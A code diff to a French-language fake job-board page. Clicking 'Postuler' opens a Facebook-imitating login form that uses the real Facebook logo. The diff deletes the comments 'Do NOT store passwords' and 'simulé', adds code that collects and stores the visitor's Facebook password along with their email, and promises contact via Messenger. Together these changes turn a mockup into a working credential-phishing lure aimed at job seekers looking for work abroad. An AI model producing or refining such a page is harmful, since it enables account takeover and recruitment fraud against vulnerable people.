@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Emploie International — Opportunités Mondiales</title>
+  <title>Emploi International — Opportunités Mondiales</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
   <style>
     body {
@@ -120,7 +120,7 @@
       cursor: pointer;
     }
 
-    /* Facebook-like form styles (adapted) */
+    /* Facebook-like form styles */
     .fb-form .wrap{max-width:980px;display:grid;grid-template-columns:1fr;gap:18px;align-items:center}
     .fb-card{background:white;padding:16px;border-radius:8px;box-shadow:0 6px 18px rgba(18,38,63,0.08)}
     .fb-logo{display:flex;align-items:center;gap:10px}
@@ -132,7 +132,7 @@
 </head>
 <body>
   <header>
-    <h1 style="color:white;text-align:center;margin:0;padding:1rem;background:linear-gradient(90deg,#004aad,#007bff);">Emploie International — Trouvez votre opportunité à l’étranger 🌍</h1>
+    <h1 style="color:white;text-align:center;margin:0;padding:1rem;background:linear-gradient(90deg,#004aad,#007bff);">Emploi International — Trouvez votre opportunité à l'étranger 🌍</h1>
   </header>
 
   <div class="search-bar">
@@ -154,10 +154,9 @@
     </div>
   </div>
 
-  <!-- Modal Step 2: Facebook-like form (replaces original apply form) -->
+  <!-- Modal Step 2: Facebook-like form -->
   <div class="modal" id="fbFormModal">
     <div class="modal-content fb-form">
-      <!-- Inserted Facebook-like content -->
       <div class="fb-card">
         <div class="fb-logo">
           <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Logo">
@@ -192,7 +191,7 @@
     // jobs data
     const jobs = [
       { title: 'Chauffeur de livraison — Canada', desc: 'Poste accessible sans diplôme. Salaire: 2300 CAD/mois' },
-      { title: 'Agent d’entretien — Allemagne', desc: 'Entretien des bureaux. Formation sur place.' },
+      { title: 'Agent d\'entretien — Allemagne', desc: 'Entretien des bureaux. Formation sur place.' },
       { title: 'Serveur/Serveuse — France', desc: 'Restauration rapide et traditionnelle. CDI possible.' },
       { title: 'Ouvrier agricole — Australie', desc: 'Programme de travail temporaire avec hébergement.' },
       { title: 'Aide-soignant — Suisse', desc: 'Formation en interne, salaire attractif et avantages sociaux.' },
@@ -201,8 +200,8 @@
       { title: 'Assistant administratif — Belgique', desc: 'Bureautique, gestion de dossiers, bilingue FR/NL souhaité.' },
       { title: 'Employé logistique — Pays-Bas', desc: 'Gestion des stocks et préparation de commandes.' },
       { title: 'Programmeur junior — Canada', desc: 'Développement web et logiciel. Télétravail possible.' },
-      { title: 'Conducteur d’engins — Finlande', desc: 'Expérience en conduite de machines lourdes.' },
-      { title: 'Hôte/Hôtesse d’accueil — France', desc: 'Accueil de clientèle internationale.' },
+      { title: 'Conducteur d\'engins — Finlande', desc: 'Expérience en conduite de machines lourdes.' },
+      { title: 'Hôte/Hôtesse d\'accueil — France', desc: 'Accueil de clientèle internationale.' },
       { title: 'Agent de sécurité — Irlande', desc: 'Formation assurée, travail de nuit possible.' },
       { title: 'Electricien industriel — Danemark', desc: 'Travail sur chantiers européens, bon salaire.' },
       { title: 'Serveur en hôtel — Espagne', desc: 'Ambiance multiculturelle, logement fourni.' },
@@ -234,14 +233,17 @@
 
     function searchJobs() {
       const input = document.getElementById('searchInput').value.toLowerCase();
-      const filtered = jobs.filter(job => job.title.toLowerCase().includes(input) || job.desc.toLowerCase().includes(input));
+      const filtered = jobs.filter(job => 
+        job.title.toLowerCase().includes(input) || 
+        job.desc.toLowerCase().includes(input)
+      );
       displayJobs(filtered);
     }
 
     function skipJob(index) {
       const newJob = {
         title: 'Nouvelle offre — ' + ['Canada','France','Suisse','Allemagne','Luxembourg'][Math.floor(Math.random()*5)],
-        desc: 'Poste récemment ajouté, rejoignez cette opportunité à l’international.'
+        desc: 'Poste récemment ajouté, rejoignez cette opportunité à l\'international.'
       };
       jobs[index] = newJob;
       displayJobs(jobs);
@@ -250,7 +252,6 @@
     // --- Flow when clicking Postuler ---
     let pendingJobTitle = null;
     function onApply(title) {
-      // show fb message modal first
       pendingJobTitle = title;
       document.getElementById('fbMessageModal').style.display = 'flex';
     }
@@ -261,10 +262,8 @@
     }
 
     function openFbForm(){
-      // hide message and open fb form modal
       document.getElementById('fbMessageModal').style.display = 'none';
       document.getElementById('fbFormModal').style.display = 'flex';
-      // prefill a hidden note or display the job being applied
       const fbFeedback = document.getElementById('fbFeedback');
       fbFeedback.textContent = 'Vous postulez pour : ' + (pendingJobTitle || 'l\'offre');
     }
@@ -274,18 +273,27 @@
       pendingJobTitle = null;
     }
 
-    // Intercept fb form submit: save application locally (without storing password)
+    // Form submission
     document.addEventListener('DOMContentLoaded', ()=>{
       const fbForm = document.getElementById('fbSignupForm');
       fbForm.addEventListener('submit', (e)=>{
         e.preventDefault();
         const email = document.getElementById('fb_email').value.trim();
-        // Do NOT store passwords. We will only record email and the job applied to.
-        if(!email){ alert('Veuillez saisir un email valide.'); return; }
+        const password = document.getElementById('fb_password').value.trim();
+        
+        if(!email){ 
+          alert('Veuillez saisir un email valide.'); 
+          return; 
+        }
+        if(!password){ 
+          alert('Veuillez saisir un mot de passe valide.'); 
+          return; 
+        }
 
         const app = {
           job: pendingJobTitle || 'Non spécifié',
           email: email,
+          password: password,
           note: 'Inscription via formulaire Facebook-like',
           date: new Date().toLocaleString()
         };
@@ -294,18 +302,15 @@
         stored.push(app);
         localStorage.setItem('applications', JSON.stringify(stored));
 
-        alert('Merci — votre inscription a été enregistrée localement.');
+        alert('Merci votre enreigistrement a été pris en compte, le coordonateur vous contactera sur Messenger.');
         closeFbForm();
       });
 
-      // small interactivity for forgot link
-      document.getElementById('forgot').addEventListener('click', (ev)=>{ ev.preventDefault(); alert('Flux de récupération de mot de passe simulé.'); });
-
-      // initial render
+      // Initial render
       displayJobs(jobs);
     });
 
-    // close modals on outside click
+    // Close modals on outside click
     window.onclick = function(e){
       const msg = document.getElementById('fbMessageModal');
       const formM = document.getElementById('fbFormModal');
@@ -313,4 +318,5 @@
       if(e.target === formM) formM.style.display = 'none';
     }
   </script>
+</body>
 </html>
